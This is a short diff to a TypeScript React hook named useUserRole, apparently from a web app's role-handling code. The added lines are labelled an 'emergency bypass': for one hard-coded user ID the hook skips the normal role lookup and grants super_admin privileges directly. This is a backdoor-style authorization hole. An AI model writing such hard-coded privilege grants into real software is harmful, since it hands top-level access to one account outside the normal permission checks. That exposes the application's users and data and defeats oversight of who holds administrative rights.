@@ -29,6 +29,15 @@ export function useUserRole(userId: string | undefined): UseUserRoleReturn {
             return;
         }
 
+        // 🚨 EMERGENCY BYPASS: Force Super Admin for specific UID
+        if (userId === 'sxcToczAAwT3Fmh8FPXa1P6hMHB3') {
+            console.log('🔓 EMERGENCY BYPASS: Granting Super Admin to:', userId);
+            setSystemRole('super_admin');
+            setHouseRoles({});
+            setLoading(false);
+            return;
+        }
+
         const fetchUserRole = async () => {
             setLoading(true);
             setError(null);
